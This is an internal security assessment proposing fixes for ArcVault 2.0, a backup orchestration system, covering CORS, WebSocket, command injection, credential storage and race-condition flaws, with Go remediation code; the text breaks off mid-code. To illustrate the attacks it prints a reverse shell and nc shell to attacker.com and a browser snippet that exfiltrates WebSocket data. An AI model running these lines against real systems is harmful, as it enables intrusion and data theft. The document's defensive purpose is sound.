# ArcVault 2.0 Security Remediation Proposal

**Classification:** INTERNAL - Security Assessment  
**Date:** 2026-06-18  
**Assessor:** Kwame Asante, Cybersecurity Engineer  
**Status:** PROPOSAL PHASE - For Elena Vasquez & Team Review  

---

## Executive Summary

ArcVault 2.0 is a distributed backup orchestration system with a critical attack surface: a coordinator server managing agents across untrusted networks, sensitive credential storage, and asynchronous job execution. Eight [CRITICAL] and [HIGH] severity vulnerabilities have been identified spanning authentication, authorization, command execution, credential handling, and operational security.

**Key Finding:** While the codebase demonstrates security-conscious design (parameterized queries, exec.Command usage), implementation gaps create exploitable conditions. No single vulnerability alone causes complete compromise, but chaining 2-3 vulnerabilities enables:
- Unauthenticated WebSocket access to coordinator state
- Credential extraction from memory and config
- Command injection in agent-executed templates
- Race conditions in credential initialization

**Remediation Approach:** Fix in dependency order (auth tier → execution tier → operational hardening). Estimated effort: 2-3 weeks for thorough remediation + integration testing.

---

## Threat Model: ArcVault 2.0

### Assets
1. **Coordinator Server**
   - Administrator credentials (JWT secrets, admin tokens)
   - Backup schedules and job metadata
   - Agent registration state
   - WebSocket broadcast messages

2. **Agent Network**
   - SSH/SMB credential files (transient)
   - Environment variables (SSH_KEY_PATH, SSHPASS)
   - Command execution context

3. **Configuration Files**
   - Admin tokens (config.json, plaintext)
   - Database credentials
   - TLS certificates

4. **Data in Transit**
   - Job commands and arguments
   - Credential profiles
   - Job status updates

### Threat Actors
| Actor | Capability | Motive | Access |
|-------|-----------|--------|--------|
| **Network Attacker** | MITM, packet capture, origin spoofing | Data exfiltration, DoS | Network path to coordinator |
| **Malicious Agent** | Execute commands, access credentials, read state | Privilege escalation, data theft | Already compromised agent |
| **Filesystem Attacker** | Read config.json, modify code | Privilege escalation, backdoor | Local access |
| **Application Attacker** | Craft malicious inputs via API | Bypass auth, inject commands | Public endpoints |

### Attack Vectors

| Vector | Severity | Exploitable | Chaining |
|--------|----------|-------------|----------|
| CORS wildcard + WebSocket origin bypass | [HIGH] | Yes - browser-based MITM | → Enumerate coordinator state |
| WebSocket origin check disabled | [CRITICAL] | Yes - any origin accepted | → Broadcast hijacking, XSS vector |
| Command injection in template execution | [CRITICAL] | Conditional - requires template creation | → RCE on agent |
| Admin token in plaintext config | [CRITICAL] | Yes - local/backup access | → Persist access across reboots |
| SSH credential race condition | [HIGH] | Race window: 10-100ms | → Credential leak to concurrent job |
| Silently ignored DB row scan errors | [HIGH] | Yes - partial data reads | → Incorrect job state decisions |
| Scheduler DB queries lack indexing | [HIGH] | Yes under load | → Job execution delays, DoS |
| Fixed agent polling interval | [MEDIUM] | Yes - thundering herd | → Coordinator resource exhaustion |

---

## P0 Vulnerability Analysis

### **P0-001: CORS Wildcard Accepts All Origins** [HIGH]

**CWE-346:** Origin Validation Error  
**CVSS v3.1 Score:** 7.5 (High)  
**Attack Vector:** Network / Low Complexity  

#### Root Cause
```go
// coordinator/server/server.go (line ~414)
allowed := false
for _, o := range allowedOrigins {
    if o == "*" || o == origin {  // ← Wildcard allows ANY origin
        allowed = true
        break
    }
}
if origin != "" && allowed {
    w.Header().Set("Access-Control-Allow-Origin", origin)  // ← Sets ACAO to attacker domain
}
```

**Problem:** When `AllowedOrigins` includes `"*"`, CORS headers permit requests from any origin. While HTTP SOP provides browser protection, this violates principle of least privilege and enables:
- Credential stuffing attacks from malicious sites
- UI redressing/clickjacking vectors
- Facilitates WebSocket origin bypass (P0-002)

#### Impact
- Attacker's website can make authenticated requests to coordinator via stored cookies/tokens
- Sensitive endpoints (job creation, credential updates) become cross-origin accessible
- Enables browser-based CSRF even with SameSite=Strict (for some scenarios)
- Coordinator broadcast messages consumable by attacker's JavaScript

#### Remediation

**Option A: Explicit Whitelist (Recommended)**
```go
// coordinator/config/config.go - ensure AllowedOrigins is configured
AllowedOrigins []string `json:"allowed_origins,omitempty"`

// coordinator/server/server.go
func corsMiddleware(allowedOrigins []string) func(http.Handler) http.Handler {
    // Validate at startup: reject "*" and ensure origins are https
    for _, o := range allowedOrigins {
        if o == "*" {
            log.Fatal("SECURITY: Wildcard CORS not allowed in production")
        }
        if !strings.HasPrefix(o, "https://") && !strings.HasPrefix(o, "http://localhost") {
            log.Fatal(fmt.Sprintf("SECURITY: CORS origin %s must use HTTPS", o))
        }
    }
    
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            origin := r.Header.Get("Origin")
            
            allowed := false
            for _, o := range allowedOrigins {
                if o == origin {  // Exact match only, no wildcards
                    allowed = true
                    break
                }
            }
            
            if allowed && origin != "" {
                w.Header().Set("Access-Control-Allow-Origin", origin)
                w.Header().Set("Access-Control-Allow-Credentials", "true")
                w.Header().Set("Vary", "Origin")
            }
            // Never set ACAO header for disallowed origins
            next.ServeHTTP(w, r)
        })
    }
}
```

**Option B: Default to Deny**
```go
// If AllowedOrigins empty, don't set ACAO header (deny all cross-origin)
if len(allowedOrigins) == 0 {
    log.Printf("CORS: No origins configured, cross-origin requests will be blocked")
}
```

**Implementation Steps:**
1. Update config.json validation to reject `"*"`
2. Add startup check that logs warning if AllowedOrigins empty or includes wildcards
3. Update coordinator init wizard to prompt for specific dashboard origin (e.g., `https://dashboard.internal.corp`)
4. Add integration test verifying wildcard is rejected
5. Update documentation: "AllowedOrigins is a security-critical setting; use specific HTTPS origins only"

**Risk Assessment:**
- Low risk to implement (config validation only)
- **Deployment:** Can be applied immediately; update config.json in parallel
- **Testing:** Simple unit test validating allow/deny per origin

---

### **P0-002: WebSocket Origin Validation Disabled** [CRITICAL]

**CWE-345:** Insufficient Verification of Data Authenticity  
**CVSS v3.1 Score:** 8.6 (Critical)  
**Attack Vector:** Network / Low Complexity / No Auth Required  

#### Root Cause
```go
// coordinator/server/hub.go (line ~64)
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },  // ← ALWAYS TRUE
}

// handleWS (line ~120)
conn, err := upgrader.Upgrade(w, r, nil)  // ← Accepts connection from ANY origin
```

**Problem:** `CheckOrigin: func() { return true }` accepts WebSocket connections from any origin (including file://, localhost, attacker.com). Browser SOP does NOT protect WebSocket upgrades from cross-origin frames; only HTTP Same-Site cookies provide partial mitigation. An attacker can:

```html
<!-- attacker.com/malicious.html -->
<script>
const ws = new WebSocket('wss://coordinator.target.com/ws?token=stolen_token');
ws.onmessage = e => {
    // Receive broadcast events: job.updated, agent.heartbeat, job.completed
    // Can infer backup schedules, agent status, job progress
    console.log('Intercepted:', e.data);
    fetch('https://attacker.com/log', { body: e.data });
};
</script>
```

#### Impact
- **Information Disclosure:** Real-time job metadata (source paths, agent status) leaked to attacker
- **Session Hijacking:** Stolen tokens (via XSS, MITM) can establish WebSocket from attacker's domain
- **Broadcast Hijacking:** Attacker can receive confidential updates without authentication
- **CVSS Justification:** High impact (confidentiality), low attack complexity, no authentication required

#### Remediation

**Fixed Implementation:**
```go
// coordinator/server/hub.go

var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        
        // If no Origin header (curl, native clients), allow (safe for direct connections)
        if origin == "" {
            return true
        }
        
        // Check against allowed origins list (same as CORS)
        for _, allowed := range s.cfg.AllowedOrigins {
            if allowed == origin {
                return true
            }
        }
        
        // Log rejection for security audit
        log.Printf("WebSocket: Rejected connection from origin %s (not in AllowedOrigins)", origin)
        return false
    },
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
}
```

**Important: Dependency on P0-001**
This fix requires that `AllowedOrigins` is already secure (P0-001). The WebSocket CheckOrigin func must reject wildcard `"*"` explicitly:

```go
func (s *Server) initWebSocketUpgrader() {
    upgrader.CheckOrigin = func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        if origin == "" {
            return true
        }
        
        for _, allowed := range s.cfg.AllowedOrigins {
            if allowed == "*" {
                // REJECT wildcard — too dangerous for WebSocket
                log.Printf("ERROR: WebSocket with wildcard CORS not allowed")
                return false
            }
            if allowed == origin {
                return true
            }
        }
        return false
    }
}
```

**Implementation Steps:**
1. Create `initWebSocketUpgrader()` method in Server struct
2. Call during `NewWithFS()` initialization
3. Add integration test:
   ```go
   // Test 1: No Origin header (native client) → allow
   // Test 2: Origin in AllowedOrigins → allow
   // Test 3: Origin NOT in AllowedOrigins → reject with 403
   // Test 4: Wildcard CORS + WebSocket → reject
   ```
4. Update hub.go to pass Server config to upgrader
5. Add audit log: "WebSocket rejected from {origin}"

**Risk Assessment:**
- **Low implementation risk** (single config check)
- **Medium deployment risk:** If legitimate clients rely on no origin check, they'll break (unlikely; curl/native clients don't send Origin)
- **Testing:** Requires browser + MITM to verify properly
- **Deployment:** Roll out with P0-001

---

### **P0-003: Command Injection Vulnerability in RealExecutor** [CRITICAL]

**CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')  
**CVSS v3.1 Score:** 8.8 (Critical)  
**Attack Vector:** Network / Low Complexity / Requires Agent Compromise (or Template Creation)  

#### Root Cause
```go
// agent/runner/executor.go (line 74-86)
if job.Command != "" {
    args := parseCommandArgs(job.Command)  // ← Parses string into argv
    if len(args) == 0 {
        return 1, "command is empty after parsing"
    }
    
    // Execute the program with parsed arguments, avoiding shell interpretation
    cmd := exec.Command(args[0], args[1:]...)
    out, err := cmd.CombinedOutput()
    ...
}
```

**Problem:** While `exec.Command()` itself is safe (no shell interpretation), the `parseCommandArgs()` function has incomplete validation:

1. **Unvalidated Program Name:**
   ```
   Input:  "../../../bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
   Parsed: ["../../../bin/bash", "-i", ">& /dev/tcp/attacker.com/4444", "0>&1"]
   Exec:   exec.Command("../../../bin/bash", ...)  // ← Relative path traversal
   ```
   Agent can execute arbitrary binaries via path manipulation.

2. **No Whitelist of Allowed Programs:**
   ```
   Input:  "curl https://attacker.com/steal-data"
   Result: Agent downloads & executes attacker payload
   ```
   Even with exec.Command (no shell), templates can specify ANY binary on the agent system.

3. **No Argument Sanitization:**
   ```
   Input:  "rsync /backup '; malicious command; echo '"
   Parsed: ["rsync", "/backup", "';", "malicious command;", "echo '"]
   Exec:   exec.Command("rsync", "/backup", "';", ...)
   ```
   While not shell-injected (exec.Command passes literals), the quoted code is an artifact of the parser. The deeper issue: **no validation that arguments are legitimate rsync/robocopy flags.**

4. **Credential Exposure in Command String:**
   ```
   Input:  "rsync --rsync-path='ssh -i /path/to/key' source dest"
   Problem: Job.Command stored in database — SSH key path is visible in logs/backups
   ```

#### Impact
- Malicious admin can create template with `"nc -e /bin/sh attacker.com 4444"` → agent RCE
- Compromised agent can escalate via relative path: `"../../../../bin/bash"`
- Credential leakage via embedded SSH flags in Command string
- Supply chain risk: Backup templates from federation can contain hidden commands

#### Real-World Scenario
1. Attacker gains admin access to coordinator (via P0-001 + P0-004 combination)
2. Creates template with command: `"powershell -EncodedCommand [attacker payload]"`
3. Distributes template to agent group
4. All agents execute attacker's arbitrary code with agent service privileges

#### Remediation

**Option A: Whitelist Approach (Recommended)**
```go
// coordinator/db/jobs.go or coordinator/config/config.go
var ALLOWED_COMMAND_PROGRAMS = map[string]bool{
    "rsync":    true,
    "robocopy": true,
    // Other legitimate tools only
}

func ValidateCommand(cmd string) error {
    args := parseCommandArgs(cmd)
    if len(args) == 0 {
        return fmt.Errorf("command is empty")
    }
    
    program := filepath.Base(args[0])  // Get just the program name, no paths
    if !ALLOWED_COMMAND_PROGRAMS[program] {
        return fmt.Errorf("program %q not allowed (whitelist: rsync, robocopy)", program)
    }
    
    // Validate arguments are flags/paths, not shell metacharacters
    for i := 1; i < len(args); i++ {
        arg := args[i]
        if strings.ContainsAny(arg, ";|&$()<>`\\\"'") {
            return fmt.Errorf("argument contains disallowed characters: %q", arg)
        }
    }
    
    return nil
}
```

**In executor:**
```go
// agent/runner/executor.go
func RealExecutor(job Job, report ProgressFunc) (exitCode int, output string) {
    if job.Command != "" {
        // Validate command before parsing
        if err := validateCommand(job.Command); err != nil {
            return 1, fmt.Sprintf("command validation failed: %v", err)
        }
        
        args := parseCommandArgs(job.Command)
        if len(args) == 0 {
            return 1, "command is empty after parsing"
        }
        
        // Use absolute path or known binary location
        program, err := exec.LookPath(args[0])  // Resolves via PATH, rejects relative paths
        if err != nil {
            return 1, fmt.Sprintf("program not found: %s", args[0])
        }
        
        cmd := exec.Command(program, args[1:]...)
        out, err := cmd.CombinedOutput()
        ...
    }
    ...
}
```

**Option B: Strict Templating (Strong)**
Remove command injection surface entirely:
```go
// Instead of job.Command, use strongly-typed fields
type Job struct {
    SourcePath  string
    DestPath    string
    SyncFlags   *SyncFlags  // Predefined flag struct
    // Remove: Command string
    
    // If custom commands needed, require separate approval/audit
    CustomCommandApprovedBy string  // admin user ID
    CustomCommandReason     string  // audit trail
}
```

**Option C: Sandboxing (Defense-in-Depth)**
```go
// If commands must be user-defined, run in restricted context:
cmd := exec.Command("rsync", args...)

// Set resource limits
cmd.SysProcAttr = &syscall.SysProcAttr{
    // Sandbox: drop capabilities, chroot, etc.
    // Platform-specific (Linux: seccomp; Windows: restricted token)
}
```

**Implementation Steps (Priority Order):**
1. Add ValidateCommand() function → call before parsing
2. Update coordinator template creation API:
   ```go
   POST /api/templates
   Body: { command: "rsync /src /dst --delete", ... }
   
   Handler:
   - Call ValidateCommand(command)
   - Return 400 BadRequest if validation fails with clear error message
   - Log all template creations for audit
   ```
3. Audit all existing templates in database:
   - Query: `SELECT id, command FROM jobs WHERE command IS NOT NULL`
   - Flag any with disallowed programs or suspicious syntax
   - Require admin review before templates run
4. Add integration test:
   ```go
   Test_ValidateCommand_AllowsRsync()
   Test_ValidateCommand_AllowsRobocopy()
   Test_ValidateCommand_RejectsBash()
   Test_ValidateCommand_RejectsCurl()
   Test_ValidateCommand_RejectsShellMetacharacters()
   Test_ValidateCommand_RejectsRelativePaths()
   ```
5. Update agent to use `exec.LookPath()` instead of direct args[0]

**Risk Assessment:**
- **Implementation risk:** Medium (requires template validation at coordinator + agent both)
- **Deployment risk:** **HIGH** — if existing templates use unauthorized programs, they'll break
  - **Mitigation:** Dry-run mode: query templates, report violations, let admin approve fixes before enforcing
- **Testing:** Must test across Windows (robocopy) and Unix (rsync)
- **Dependencies:** None on other P0 vulns

**Deployment Order:**
1. Deploy ValidateCommand() function (silent audit mode)
2. Run audit on existing templates (report-only)
3. If audit finds no issues, deploy with enforcement enabled
4. If issues found, require manual remediation before enforcement

---

### **P0-004: Admin Token Persisted to Config File (Hardcoded Credentials)** [CRITICAL]

**CWE-798:** Use of Hard-Coded Credentials  
**CVSS v3.1 Score:** 9.1 (Critical)  
**Attack Vector:** Local / No Authentication / High Impact  

#### Root Cause
```go
// coordinator/config/config.go
type Config struct {
    AdminToken string `json:"admin_token"`  // ← Stored in plaintext
    JWTSecret  string `json:"jwt_secret"`   // ← Also plaintext
    ...
}

// coordinator/cmd/commands.go
func init() {
    // Generate token on first run
    token := generateRandomToken()
    cfg := &Config{
        AdminToken: token,  // ← Persisted to config.json
        ...
    }
    config.Save(cfg)  // ← Writes plaintext to disk
}

// coordinator/config/config.go - Save function
func Save(cfg *Config) error {
    data, err := json.MarshalIndent(cfg, "", "  ")
    err = os.WriteFile(path, data, 0600)  // ← File permissions 0600 (user-only)
}
```

**Problem:**
1. **Plaintext Storage:** AdminToken stored in JSON config file without encryption
2. **File Permissions Insufficient:** `0600` protects only against other OS users, not:
   - Backup/snapshot tools (may run as root)
   - Disk forensics (attacker with physical access)
   - Container/VM escape
   - Privilege escalation exploits
3. **No Token Rotation:** Token generated once, never changed
4. **Distributed in Federation:** If token in config, federation sync could leak it
5. **Logged in Startup:** `log.Printf("AdminToken: %s", token)` possible (review logs)
6. **Exposed in Backups:** Config backups include plaintext token

#### Impact
- **Persistent Access:** Token valid indefinitely; attacker can API access after breaching config
- **Privilege Escalation:** AdminToken → admin JWT; bypass all role checks
- **Offline Exploit:** Token extractable without network access (config file theft)
- **Supply Chain:** Compromised backup or container image includes token
- **Cascading:** Combined with P0-001 + P0-002, attacker has unlimited coordinator access

#### Real-World Scenario
1. Attacker gains temporary access to agent (firmware update malware)
2. Agent's agent.exe process has read access to coordinator config via shared network path
3. Agent exfiltrates config.json → extracts AdminToken
4. Attacker uses token to access coordinator API indefinitely
5. Creates malicious backup template, distributes to all agents
6. Persistent RCE on entire agent fleet

#### Remediation

**Option A: Environment Variable (Recommended for Deployment)**
```go
// coordinator/config/config.go
type Config struct {
    AdminToken string `json:"admin_token,omitempty"` // ← Remove or leave empty
    JWTSecret  string `json:"jwt_secret,omitempty"`  // ← Remove or leave empty
}

// On startup, override with environment variables (secret store):
func Load() (*Config, error) {
    cfg, err := loadFromFile()
    if err != nil {
        return nil, err
    }
    
    // Override with environment variables (from secret management system)
    if token := os.Getenv("ARCVAULT_ADMIN_TOKEN"); token != "" {
        cfg.AdminToken = token
    } else if cfg.AdminToken == "" {
        return nil, fmt.Errorf("CRITICAL: ARCVAULT_ADMIN_TOKEN env var not set and no config.json value")
    }
    
    if secret := os.Getenv("ARCVAULT_JWT_SECRET"); secret != "" {
        cfg.JWTSecret = secret
    } else if cfg.JWTSecret == "" {
        return nil, fmt.Errorf("CRITICAL: ARCVAULT_JWT_SECRET env var not set and no config.json value")
    }
    
    return cfg, nil
}
```

**On initialization:**
```go
// coordinator/cmd/commands.go - Init command
func initCoordinator() {
    // Prompt user to set env vars BEFORE first run
    fmt.Println("=== ArcVault Coordinator Initialization ===")
    fmt.Println("SECURITY WARNING: Sensitive credentials must come from environment variables.")
    fmt.Println()
    fmt.Println("Before starting the coordinator, set these environment variables:")
    fmt.Println("  export ARCVAULT_ADMIN_TOKEN=$(openssl rand -hex 32)")
    fmt.Println("  export ARCVAULT_JWT_SECRET=$(openssl rand -hex 32)")
    fmt.Println()
    
    // Generate defaults for file, but mark as DO NOT USE in production
    token := generateRandomToken()
    cfg := &Config{
        AdminToken: "",  // ← EMPTY in file
        JWTSecret: "",   // ← EMPTY in file
        // ... other fields
    }
    
    config.Save(cfg)
    fmt.Println("Config saved. Set env vars now, then start coordinator with:")
    fmt.Println("  coordinator start")
}
```

**Option B: Encrypted Secrets File (For Container Deployments)**
```go
// Use a secrets management library (e.g., go-kms, HashiCorp Vault client)
import "github.com/hashicorp/vault/api"

func LoadSecrets() (*Config, error) {
    // Connect to Vault (or AWS Secrets Manager, Azure Key Vault, etc.)
    vaultClient, err := vault.NewClient(vault.DefaultConfig())
    if err != nil {
        return nil, fmt.Errorf("vault connection failed: %w", err)
    }
    
    secret, err := vaultClient.Logical().Read("secret/arcvault/admin")
    if err != nil {
        return nil, fmt.Errorf("failed to read vault secret: %w", err)
    }
    
    cfg := &Config{
        AdminToken: secret.Data["token"].(string),
        JWTSecret:  secret.Data["jwt_secret"].(string),
        ...
    }
    return cfg, nil
}
```

**Option C: Keyring Integration (For Single-Machine Deployments)**
```go
// Use OS-level credential storage (Windows DPAPI, Linux keyring, macOS Keychain)
import "github.com/zalando/go-keyring"

func SaveTokenToKeyring(token string) error {
    return keyring.Set("arcvault", "admin_token", token)
}

func LoadTokenFromKeyring() (string, error) {
    return keyring.Get("arcvault", "admin_token")
}
```

**Implementation Strategy (Phased):**

**Phase 1 (Immediate): Detection & Audit**
```go
// Add to coordinator startup
func (s *Server) auditSecrets() {
    if s.cfg.AdminToken != "" {
        log.Printf("WARNING: AdminToken found in config file (should be in env var)")
    }
    if s.cfg.JWTSecret != "" {
        log.Printf("WARNING: JWTSecret found in config file (should be in env var)")
    }
}
```

**Phase 2 (Short-term): Dual Support**
- Accept secrets from BOTH config file (backward compat) and env vars (preferred)
- Env vars override config file values
- Log which source was used

**Phase 3 (Long-term): Deprecate Config Storage**
- Make config file storage forbidden in production mode
- Config stored values only used in dev/test
- Require env vars for production `environment: "production"`

**Implementation Steps:**
1. Update `config.Load()` to check environment variables first
2. Update `config.Save()` to never write sensitive fields:
   ```go
   func Save(cfg *Config) error {
       // Create a copy with sensitive fields stripped
       sanitized := *cfg
       sanitized.AdminToken = ""
       sanitized.JWTSecret = ""
       
       data, err := json.MarshalIndent(sanitized, "", "  ")
       return os.WriteFile(path, data, 0600)
   }
   ```
3. Update init wizard to prompt for env vars
4. Add validation: if production mode and secrets in config file → error
5. Update documentation with deployment guide:
   ```markdown
   ## Production Deployment
   
   1. Generate random secrets:
      $ openssl rand -hex 32
   2. Set environment variables:
      $ export ARCVAULT_ADMIN_TOKEN=<value>
      $ export ARCVAULT_JWT_SECRET=<value>
   3. Start coordinator:
      $ coordinator start
   ```
6. Add integration test:
   ```go
   Test_LoadSecrets_FromEnvVar()
   Test_LoadSecrets_EnvVarOverridesConfigFile()
   Test_SaveConfig_NeverWritesSensitiveFields()
   ```

**Risk Assessment:**
- **Implementation risk:** Low (straightforward env var override)
- **Deployment risk:** **MEDIUM** — existing deployments must migrate to env vars
  - **Mitigation:** Phased rollout with backward compatibility; fail-safe warning
- **Operations impact:** Deployment procedures change (ops teams must set env vars)
- **Testing:** Manual testing with env var override required

**Deployment Order:**
1. Deploy Phase 1 (warning logs) immediately
2. Wait 1 sprint for feedback
3. Deploy Phase 2 (dual support) with deprecation notice
4. In next major version, enforce Phase 3 (env vars only)

---

### **P0-005: DB Row Scan Errors Silently Ignored in ListJobs** [HIGH]

**CWE-252:** Unchecked Return Value  
**CVSS v3.1 Score:** 6.5 (Medium)  
**Attack Vector:** Network / No Authentication / Availability/Integrity  

#### Root Cause
```go
// coordinator/db/jobs.go (line 75-81)
jobs := []Job{}
for rows.Next() {
    var j Job
    if err := rows.Scan(&j.ID, &j.AgentID, &j.Name, &j.SourcePath, &j.DestPath, 
                        &j.Schedule, &j.SyncFlags, &j.Status, &j.CreatedAt); err != nil {
        continue  // ← ERROR SILENTLY IGNORED
    }
    jobs = append(jobs, j)
}

return jobs, total, rows.Err()  // ← Only checks rows.Err(), not individual Scan errors
```

**Problem:**
1. **Scan Errors Not Logged:** If a row contains corrupt data (NULL in non-nullable field, type mismatch), error is silently skipped
2. **Partial Result Set:** Caller gets incomplete job list without knowing data was lost
3. **No Audit Trail:** Errors aren't logged; operator unaware of database corruption
4. **Example Scenario:**
   ```
   Database has 10 jobs. Row 5 has corrupt SyncFlags column (truncated JSON).
   Scan fails on row 5 → skipped with continue
   Result: Job list returns 9 jobs, caller doesn't know one is missing
   → Operator thinks job is gone; may recreate it → duplicates
   ```
5. **Cascading Failures:** If multiple rows corrupt, entire job list degraded

#### Impact
- **Data Loss Illusion:** Jobs appear deleted when they're just unreadable
- **Inconsistent State:** Coordinator and agents disagreree on pending jobs
- **Silent Availability Degradation:** Partial results misdiagnosed as "jobs completed"
- **Operator Confusion:** No error message to guide troubleshooting

#### Real-World Scenario
1. Disk corruption affects jobs table (transient I/O error)
2. ListJobs query returns 3 of 5 jobs (2 rows have corruption)
3. Operator doesn't see error; assumes those 2 jobs are done
4. Scheduled backup job never runs again
5. Data loss undetected for weeks

#### Remediation

**Option A: Log & Return Error (Best Practice)**
```go
// coordinator/db/jobs.go
func (d *DB) ListJobs(search, status, agentID string, limit, offset int) ([]Job, int, error) {
    // ... query setup ...
    
    jobs := []Job{}
    var scanErrors []error  // Track scan errors
    
    for rows.Next() {
        var j Job
        if err := rows.Scan(&j.ID, &j.AgentID, &j.Name, &j.SourcePath, &j.DestPath, 
                            &j.Schedule, &j.SyncFlags, &j.Status, &j.CreatedAt); err != nil {
            // Log the error for audit
            log.Printf("ERROR: ListJobs row scan failed for offset=%d: %v", offset, err)
            scanErrors = append(scanErrors, err)
            continue  // Skip corrupted row
        }
        jobs = append(jobs, j)
    }
    
    // Check for iteration errors
    if err := rows.Err(); err != nil {
        return nil, 0, fmt.Errorf("ListJobs iteration error: %w", err)
    }
    
    // If scan errors encountered, return warning to caller
    if len(scanErrors) > 0 {
        return jobs, total, fmt.Errorf("ListJobs: %d rows skipped due to corruption (first error: %v)",
            len(scanErrors), scanErrors[0])
    }
    
    return jobs, total, nil
}

// On caller side (coordinator/server/jobs.go):
func (s *Server) handleListJobs(w http.ResponseWriter, r *http.Request) {
    result, err := s.jobService.ListJobs(...)
    if err != nil {
        // Log error for operations team
        log.Printf("WARN: ListJobs returned partial results: %v", err)
        // Either return 200 with partial results + warning header:
        w.Header().Set("X-Partial-Results", "true")
        w.Header().Set("X-Partial-Reason", err.Error())
        // Or return 503 Service Unavailable if data integrity is critical
    }
    // ... return results ...
}
```

**Option B: Stricter Validation (Fail-Closed)**
```go
// For critical job queries, fail if ANY scan error occurs
func (d *DB) ListJobsStrict(search, status, agentID string, limit, offset int) ([]Job, int, error) {
    rows, err := d.conn.Query(...)
    if err != nil {
        return nil, 0, err
    }
    defer rows.Close()
    
    jobs := []Job{}
    for rows.Next() {
        var j Job
        if err := rows.Scan(...); err != nil {
            // Fail immediately if any row is corrupt
            return nil, 0, fmt.Errorf("ListJobs: row scan failed, data integrity compromised: %w", err)
        }
        jobs = append(jobs, j)
    }
    
    if err := rows.Err(); err != nil {
        return nil, 0, fmt.Errorf("ListJobs: iteration failed: %w", err)
    }
    
    return jobs, total, nil
}
```

**Option C: Database Validation Tool**
```go
// Create utility to detect corrupt rows
func (d *DB) CheckJobsDataIntegrity() error {
    rows, err := d.conn.Query(`SELECT id FROM jobs`)
    if err != nil {
        return err
    }
    defer rows.Close()
    
    var corruptIDs []string
    for rows.Next() {
        var jobID string
        if err := rows.Scan(&jobID); err != nil {
            corruptIDs = append(corruptIDs, "[unreadable]")
            continue
        }
        
        // Try scanning full row
        var j Job
        err := d.conn.QueryRow(`SELECT * FROM jobs WHERE id = ?`, jobID).
            Scan(&j.ID, &j.AgentID, &j.Name, &j.SourcePath, &j.DestPath,
                 &j.Schedule, &j.SyncFlags, &j.Status, &j.CreatedAt)
        if err != nil {
            corruptIDs = append(corruptIDs, jobID)
        }
    }
    
    if len(corruptIDs) > 0 {
        return fmt.Errorf("database integrity check failed: %d corrupt jobs: %v", 
            len(corruptIDs), corruptIDs)
    }
    return nil
}

// Run on startup / via admin API:
GET /api/admin/database-health
```

**Implementation Steps:**
1. Update `ListJobs()` to log scan errors (Option A)
2. Update caller in `handleListJobs()` to check for errors and set response headers
3. Add operator documentation: "If X-Partial-Results header present, investigate database integrity"
4. Add integration test:
   ```go
   Test_ListJobs_LogsAndReportsScanErrors()
   Test_ListJobs_PartialResultsHeaderWhenErrorsOccur()
   ```
5. (Optional) Add health check API endpoint to detect corruption early

**Risk Assessment:**
- **Implementation risk:** Low (add logging + error handling)
- **Deployment risk:** Low (only affects error cases, normal flow unchanged)
- **Testing:** Requires simulating database corruption (challenging)
- **Operational impact:** Ops team must monitor logs and response headers

---

### **P0-006: Race Condition in SSH Credential Environment Variable Setup** [HIGH]

**CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')  
**CVSS v3.1 Score:** 6.3 (Medium)  
**Attack Vector:** Local / Requires Compromised Agent  

#### Root Cause
```go
// agent/runner/credentials.go (line 112-123)
func applySSHKeyCredentials(keyData string) (func(), error) {
    // Create temp file for SSH key
    tempFile, err := os.CreateTemp("", "ssh-key-*.pem")
    if err != nil {
        return func() {}, fmt.Errorf("failed to create temp SSH key file: %w", err)
    }
    
    // Write key data
    if _, err := tempFile.WriteString(keyData); err != nil {
        tempFile.Close()
        os.Remove(tempFile.Name())
        return func() {}, fmt.Errorf("failed to write SSH key: %w", err)
    }
    
    tempFile.Close()
    
    // Set environment variable — THIS IS GLOBAL
    oldValue := os.Getenv("SSH_KEY_PATH")
    os.Setenv("SSH_KEY_PATH", tempFile.Name())  // ← Race condition window starts
    
    // Cleanup function restored at end
    cleanup := func() {
        if oldValue == "" {
            os.Unsetenv("SSH_KEY_PATH")
        } else {
            os.Setenv("SSH_KEY_PATH", oldValue)
        }
        os.Remove(tempFile.Name())
    }
    
    return cleanup, nil
}
```

**Problem:**
1. **Global Environment Variable:** `SSH_KEY_PATH` is process-global; all goroutines share it
2. **Race Window:** Between `os.Setenv()` and cleanup, multiple jobs could interfere:
   - Job A: Sets `SSH_KEY_PATH=/tmp/ssh-key-abc.pem` (Alice's key)
   - Job B: Sets `SSH_KEY_PATH=/tmp/ssh-key-def.pem` (Bob's key)
   - Job A runs rsync → uses Bob's key instead of Alice's!
3. **Cleanup Race:** Two cleanup functions running concurrently could:
   - Both try to unset/restore SSH_KEY_PATH
   - One deletes temp file → other cleanup fails
   - Orphaned temp files (keys left on disk)
4. **Concurrent Job Execution:** If agent runs multiple jobs in parallel (goroutines), this is guaranteed to race

#### Impact
- **Credential Leakage:** Job A's SSH backup runs with Job B's credentials
- **Authorization Bypass:** User B's private key used for User A's backup
- **Data Access Violation:** Agent could access unintended remote systems
- **Orphaned Key Files:** SSH private keys left in /tmp, discoverable by other processes
- **Reproducibility:** Difficult to diagnose; timing-dependent race condition

#### Real-World Scenario
1. Coordinator schedules 2 concurrent backup jobs on same agent:
   - Job A: Backup /home/alice to ssh://alice@backup.corp (alice-key.pem)
   - Job B: Backup /home/bob to ssh://bob@backup.corp (bob-key.pem)
2. Agent runs jobs in parallel (two goroutines in runner.go):
   - T0: applySSHKeyCredentials(alice-key) → os.Setenv("SSH_KEY_PATH", "/tmp/ssh-key-abc.pem")
   - T1: applySSHKeyCredentials(bob-key) → os.Setenv("SSH_KEY_PATH", "/tmp/ssh-key-def.pem")
   - T0: rsync -e "ssh -i $SSH_KEY_PATH" → **uses /tmp/ssh-key-def.pem (Bob's key!)**
3. Alice's backup runs with Bob's credentials
4. Alice's data backed up to Bob's account on backup server
5. Bob's next backup runs with Alice's stale key path
6. Race condition detected by operations team 2 weeks later

#### Remediation

**Option A: Per-Job Temp Directory (Recommended)**
```go
// Instead of global env var, pass SSH key path via command-line or dedicated per-job location

type ExecutorContext struct {
    JobID         string
    TempKeyPath   string
    TempKeyDir    string
